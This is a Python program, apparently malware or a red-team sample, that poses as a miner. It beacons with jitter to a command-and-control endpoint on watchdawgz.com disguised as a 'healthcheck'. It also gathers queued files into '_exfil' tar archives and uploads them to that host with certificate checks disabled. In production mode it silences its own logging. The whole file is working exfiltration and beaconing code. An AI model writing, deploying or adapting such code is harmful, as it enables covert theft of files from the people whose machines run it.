import uuid
import datetime
import hashlib
import string
import time
import requests
import json
import logging
import os
import tarfile
import threading
from random import choice, randint
from collections import deque
import urllib3
import select
import platform


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== CONFIG ==========
ENV = os.environ.get("ENV", "DEV").upper()
CONFIG = {
    "DEV": {
        "BASE_URL": "https://watchdawgz.com/healthcheck",
    },
    "PROD": {
        "BASE_URL": "https://watchdawgz.com/healthcheck",
    },
}[ENV]

TARGET = 3 * 10**45  # Target difficulty
PROCESSING_DELAY = 0.1  # Delay per hash
logger = logging.getLogger("Miner")
if ENV == "DEV":
    logging.basicConfig(level=logging.INFO)
else:
    logging.basicConfig(level=logging.CRITICAL)  # Suppresses INFO/WARNING/ERROR


IS_WINDOWS = platform.system() == "Windows"


# ========== COMPONENTS ==========


class PhoneHome:
    def __init__(self):
        self.heartbeat = 30
        self.jitter = 15

    def fetch_beacon_config(self, miner_id):
        url_ext = "check/"
        try:
            r = requests.post(
                f"{CONFIG['BASE_URL']}/{url_ext}", json={"miner_id": miner_id}
            )
            r.raise_for_status()
            p = r.json()
            self.heartbeat = p["h"]
            self.jitter = p["j"]
            logger.info(
                f"[+] Updated heartbeat to {self.heartbeat}, jitter to {self.jitter}"
            )
        except Exception as e:
            logger.error(f"[-] Failed beacon config fetch: {e}")

    def submit_coin(self, coin_result, miner_id):
        url_ext = "pass/"
        try:
            payload = {"kk": coin_result, "mid": miner_id}
            r = requests.post(f"{CONFIG['BASE_URL']}/{url_ext}", json=payload)
            logger.info(f"[+] Submitted coin: {r.text}")
        except Exception as e:
            logger.error(f"[-] Failed to submit coin: {e}")

    def get_next_checkin_time(self):
        now = datetime.datetime.now()
        offset = self.heartbeat + randint(0, self.jitter) * (
            -1 if now.microsecond % 2 == 0 else 1
        )
        return now + datetime.timedelta(seconds=offset)


class CoinMiner:
    def mine(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        seed = "".join(choice(chars) for _ in range(randint(1, 20)))
        digest = hashlib.sha1(seed.encode("utf-8"))
        time.sleep(PROCESSING_DELAY)
        return digest

    def meets_target(self, digest):
        value = int(digest.hexdigest(), digest.digest_size)
        return value < TARGET


class FileStack:
    def __init__(self, idle_timeout=10):
        self.stack = deque()
        self.last_activity = datetime.datetime.now()
        self.idle_timeout = idle_timeout
        self.counter = 0

    def add(self, path):
        self.stack.append(path)
        self.last_activity = datetime.datetime.now()

    def is_idle(self):
        return (
            datetime.datetime.now() - self.last_activity
        ).seconds > self.idle_timeout

    def bundle(self):
        archive_name = f"{self.counter}_exfil.tar.gz"
        with tarfile.open(archive_name, "w:gz") as tar:
            while self.stack:
                f = self.stack.popleft()
                if os.path.isfile(f):
                    tar.add(f, arcname=os.path.basename(f))
        self.counter += 1
        return archive_name


file_stack = FileStack()


# ========== THREAD TARGETS ==========


def mining_loop(miner_id, stop_event):
    beacon = PhoneHome()
    miner = CoinMiner()
    beacon_time = datetime.datetime.now()

    while not stop_event.is_set():
        if datetime.datetime.now() >= beacon_time:
            beacon.fetch_beacon_config(miner_id)
            beacon_time = beacon.get_next_checkin_time()

        digest = miner.mine()
        if miner.meets_target(digest):
            beacon.submit_coin(digest.hexdigest(), miner_id)


def file_watcher_loop(miner_id, stop_event):
    while not stop_event.is_set():
        time.sleep(5)
        if file_stack.is_idle() and file_stack.stack:
            archive = file_stack.bundle()
            with open(archive, "rb") as f:
                files = {
                    "upload": (archive, f, "application/gzip"),
                    "metadata": (None, json.dumps({"uuid": miner_id})),
                }
                try:
                    r = requests.post(
                        f"{CONFIG['BASE_URL']}/update/",
                        files=files,
                        verify=False,
                    )
                    logger.info(
                        f"[+] Uploaded archive: {archive} => {r.status_code}",
                    )
                except Exception as e:
                    logger.error(f"[-] Failed archive upload: {e}")
            os.remove(archive)


def fifo_listener_loop(stop_event):
    if IS_WINDOWS:
        # Use file-based listener
        FIFO_PATH = "fifo_sim.txt"
        last_pos = 0
        path = "fifo_sim.txt"
        open(path, "a").close()  # ensure it exists

        logger.info("[*] FIFO (sim) listener started.")
        while not stop_event.is_set():
            with open(path, "r") as f:
                f.seek(last_pos)
                lines = f.readlines()
                last_pos = f.tell()

                for line in lines:
                    filepath = line.strip()
                    if os.path.isfile(filepath):
                        file_stack.add(filepath)
                        logger.info(f"[+] Queued for exfil: {filepath}")
            time.sleep(1)
    # else:
    #     FIFO_PATH = "/tmp/fifo"
    #     if not os.path.exists(FIFO_PATH):
    #         os.mkfifo(FIFO_PATH)

    #     if not os.path.exists(FIFO_PATH):
    #         os.mkfifo(FIFO_PATH)
    #         logger.info(f"[+] Created FIFO at {FIFO_PATH}")

    #     fifo = open(FIFO_PATH, "r")
    #     logger.info("[*] FIFO listener started.")

    #     try:
    #         while not stop_event.is_set():
    #             rlist, _, _ = select.select([fifo], [], [], 1)
    #             if fifo in rlist:
    #                 while True:
    #                     line = fifo.readline()
    #                     if not line:
    #                         break  # end of current batch of input
    #                     filepath = line.strip()
    #                     if os.path.isfile(filepath):
    #                         file_stack.add(filepath)
    #                         logger.info(f"[+] Queued for exfil: {filepath}")
    #                     else:
    #                         logger.warning(f"[!] Ignored non-file path: {filepath}")
    #     except Exception as e:
    #         logger.error(f"[!] FIFO listener error: {e}")
    #     finally:
    #         fifo.close()
    #         logger.info("[*] FIFO listener stopped.")




# ========== MAIN ENTRY ==========


def main():
    miner_id = uuid.uuid4().hex
    stop_event = threading.Event()

    threads = [
        threading.Thread(
            target=mining_loop,
            args=(miner_id, stop_event),
            daemon=True,
        ),
        threading.Thread(
            target=file_watcher_loop,
            args=(miner_id, stop_event),
            daemon=True,
        ),
        threading.Thread(
            target=fifo_listener_loop,
            args=(stop_event,),
            daemon=True,
        ),
    ]

    for t in threads:
        t.start()

    logger.info(f"[*] Miner started with ID: {miner_id}")
    try:
        while any(t.is_alive() for t in threads):
            time.sleep(0.5)
    except KeyboardInterrupt:
        logger.info("[!] Shutdown signal received. Cleaning up...")
        stop_event.set()
        for t in threads:
            t.join(timeout=5)  # optional timeout
        logger.info("[+] All threads shut down cleanly.")


if __name__ == "__main__":
    main()
